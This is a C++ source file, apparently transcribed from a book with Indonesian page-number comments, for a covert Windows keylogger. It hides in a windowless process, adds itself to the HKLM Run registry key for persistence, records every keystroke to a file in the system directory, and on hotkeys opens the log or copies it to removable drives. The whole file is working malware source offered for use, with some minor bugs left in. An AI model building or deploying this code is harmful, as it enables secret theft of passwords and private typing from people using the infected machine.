/* ---------------------------------------------
   nama file: main.cpp
   halaman 37
   --------------------------------------------- */

#include <windows.h>
#include <cstdio>
#include <iostream>

// ini aslinya gak ada
#include <time.h>
#include <stdlib.h>
//#include <stdio.h>

#include "regaccess.h"

using namespace std;

// ini aslinya
//LRESULT CALLBACK WindowsProcedure(HWND,UINT,WPARAM,LPARAM);
LRESULT CALLBACK WindowProcedure(HWND,UINT,WPARAM,LPARAM);

DWORD WINAPI Keylog_Thread(LPVOID Param);

void InvokeLogFile(void);
void CopyToUFD(void);
char* DateTime_Now(void);

char szClassName[ ] = "WindowsApp";
DWORD id = 0;
char szCurrent[MAX_PATH] = {'\0'};

int WINAPI WinMain(HINSTANCE hThisInstance,
                   HINSTANCE hPrevInstance,
                   LPSTR lpszArgument, int nFunsterStil)
                   
// ini aslinya                   
//                   LPSTR lpszArgument, int nDunsterStil)

{
    HWND hwnd;
    MSG messages;
    WNDCLASSEX wincl;
    char szPath[MAX_PATH];

    CreateMutex(NULL, true, "WindowsApp");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        return 0;

    GetModuleFileName(NULL, szCurrent, MAX_PATH-1);

    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    // ini aslinya
    //wincl.lpfnWndProc = WindowsProcedure;
    wincl.lpfnWndProc = WindowProcedure;

    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor  (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    if (!RegisterClassEx(&wincl))
        return 0;
   
// halaman 38
GetSystemDirectory(szPath, sizeof(szPath));
strncat(szPath, "\\", MAX_PATH-1);
strncat(szCurrent, szPath, true);

// halaman 38
// ini aslinya
//SetStringValue(HKLM

SetStringValue(HKLM,
               "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
               "Logging",
               szPath);

hwnd = CreateWindowEx(0, szClassName,"", WS_POPUP, 0, 0,
                      0, 0, 0, 0, hThisInstance, NULL);

RegisterHotKey(hwnd, 7, MOD_ALT | MOD_CONTROL, 0x42);
RegisterHotKey(hwnd, 8, MOD_ALT | MOD_CONTROL, 0x43);

CreateThread(NULL, 0, &Keylog_Thread, NULL, 0, &id);

    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return messages.wParam;
}

// aslinya
//LRESULT CALLBACK WindowsProcedure (HWND hwnd, UINT message,
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message,
                                   WPARAM wParam,
                                   LPARAM lParam)
{
    switch (message)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_HOTKEY:
        switch(wParam)
        {
        case 7:
            InvokeLogFile();
            break;
        case 8:
            CopyToUFD();
            break;
        }
       default:
       	  // ini aslinya
          //return DefWindowProc (hwnd, messagem wParam, lParam);
          return DefWindowProc (hwnd, message, wParam, lParam);
    }
   // ini aslinya belum disalin
   return 0;
}

DWORD WINAPI Keylog_Thread(LPVOID Param)
{
    FILE *file;
    char szLog[MAX_PATH];

    GetSystemDirectory(szLog, sizeof(szLog));
    strncat(szLog, "\\", MAX_PATH-1);
    strncat(szLog, "logtext.txt", MAX_PATH-1);

    file = fopen(szLog, "a+");

    fputs("\r\n",file);
    fputs(DateTime_Now(), file);
    fputs("\r\n",file);

    short character;
    while (1)
    {
        Sleep(10); // Mencegah 100% CPU Usage
        for (character=8; character<=222; character++)
        {
            if (GetAsyncKeyState(character) == -32767)
            {
                FILE *file;
                file=fopen(szLog, "a+");

                if (file==NULL)
                    return 1;

                if (file!=NULL)
                {
                    if ((character>=39) && (character<=64))
                    {
                        fputc(character,file);
                        fclose(file);
                        break;
                    }
                    else if ((character>64) && (character<91))
                    {
                        character+=32;
                        fputc(character,file);
                        fclose(file);
                        break;
                    }
                    else
                    {
                        switch (character)
                        {
                        case VK_SPACE:
                        	// ini aslinya
                            //fputs(' ',file);
                            fputc(' ',file);
                            fclose(file);
                            break;
                        case VK_SHIFT:
                            fputs("\r\n[SHIFT]\r\n",file);
                            fclose(file);
                            break;
                        case VK_RETURN:
                            fputs("\r\n[[ENTER]]\r\n",file);
                            fclose(file);
                            break;
                        case VK_BACK:
                            fputs("\r\n[BACKSPACE]\r\n",file);
                            fclose(file);
                            break;
                        case VK_TAB:
                            fputs("\r\n[TAB]\r\n",file);
                            fclose(file);
                            break;
                        case VK_CONTROL:
                            fputs("\r\n[[CTRL]]\r\n",file);
                            fclose(file);
                            break;
                        case VK_DELETE:
                            fputs("\r\n[DEL]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_1:
                            fputs("\r\n[;:]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_2:
                            fputs("\r\n[/?]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_3:
                            fputs("\r\n[`~]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_4:
                            fputs("\r\n\[ [{ ]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_5:
                            fputs("\r\n[\\|]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_6:
                            fputs("\r\n[ ]} ]\r\n",file);
                            fclose(file);
                            break;
                        case VK_OEM_7:
                            fputs("\r\n['\"]\r\n",file);
                            fclose(file);
                            break;
                        case 187:
                            fputc('+',file);
                            fclose(file);
                            break;
                        case 188:
                            fputc(',',file);
                            fclose(file);
                            break;
                        case 189:
                            fputc('-',file);
                            fclose(file);
                            break;
                        case 190:
                            fputc('.',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD0:
                            fputc('0',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD1:
                            fputc('1',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD2:
                            fputc('2',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD3:
                            fputc('3',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD4:
                            fputc('4',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD5:
                            fputc('5',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD6:
                            fputc('6',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD7:
                            fputc('7',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD8:
                            fputc('8',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD9:
                            fputc('9',file);
                            fclose(file);
                            break;
                        case VK_CAPITAL:
                            fputs("\r\n[CAPS LOCK]\r\n",file);
                            fclose(file);
                            break;
                        default:
                            fclose(file);
                            break;
                        }
                    }
                }
            }
        }
        fclose(file);
    }
    return EXIT_SUCCESS;
}

// halaman 46
// ini aslinya
//char* DateTime_Now(viod)
char* DateTime_Now(void)
{
    time_t now;
    tm *tm;
    char szBuf[1024] = {'\0'};
    char szConv[10] = {'\0'};

    time(&now);
    tm = localtime(&now);
    itoa((*tm).tm_mday, szConv, 10);
    strncpy(szBuf, szConv, sizeof(szBuf)-1);
    strncat(szBuf, "/", sizeof(szBuf)-1);

    itoa((*tm).tm_mon+1, szConv, 10);
    strncat(szBuf, szConv, sizeof(szBuf)-1);
    strncat(szBuf, "/", sizeof(szBuf)-1);

    itoa((*tm).tm_year+1900, szConv, 10);
    strncat(szBuf, szConv, sizeof(szBuf)-1);
    strncat(szBuf, "-", sizeof(szBuf)-1);

    itoa((*tm).tm_hour, szConv, 10);
    strncat(szBuf, szConv, sizeof(szBuf)-1);
    
    // ini aslinya
    //strncat(szBuf, ":", sizeof(szB)-1);
    strncat(szBuf, ":", sizeof(szBuf)-1);

    itoa((*tm).tm_min, szConv, 10);
    strncat(szBuf, szConv, sizeof(szBuf)-1);
    strncat(szBuf, ":", sizeof(szBuf)-1);

    itoa((*tm).tm_sec, szConv, 10);
    strncat(szBuf, szConv, sizeof(szBuf)-1);

    char *szReturn = new char[strlen(szBuf)];

    strcpy(szReturn, szBuf);

    return szReturn;

}

// halaman 47
void CopyToUFD(void)
{
    char szLog[MAX_PATH];
    char szDest[MAX_PATH] = {'\0'};

    GetSystemDirectory(szLog, sizeof(szLog));
    strncat(szLog, "\\", MAX_PATH-1);
    strncat(szLog, "logtext.txt", MAX_PATH-1);

    char *drv[10] = {"A:", "B:", "C:", "D:", "E:",
                     "F:", "G:", "H:", "I:", "J:"};

    for (int i=0; i < 10; i++)
    {
        if (GetDriveType(drv[i]) == DRIVE_REMOVABLE)
        {
        	// ini aslinya
            //strncpy(szDest, drv[i], strln(drv[i]));
            strncpy(szDest, drv[i], strlen(drv[i]));
            strncat(szDest, "\\", MAX_PATH-1);
            strncat(szDest, "logtext.txt", MAX_PATH-1);

            CopyFile(szLog, szDest, false);
        }
    }
}

// halaman 49
void InvokeLogFile(void)
{
    char szLog[MAX_PATH];

    GetSystemDirectory(szLog, sizeof(szLog));
    strncat(szLog, "\\", MAX_PATH-1);
    strncat(szLog, "logtext.txt", MAX_PATH-1);

    ShellExecute(NULL, "open", szLog, NULL, NULL, SW_SHOW);
}

/* --------------------------------------------
    return 0;
}
    ini yang salah posisi
   -------------------------------------------- */

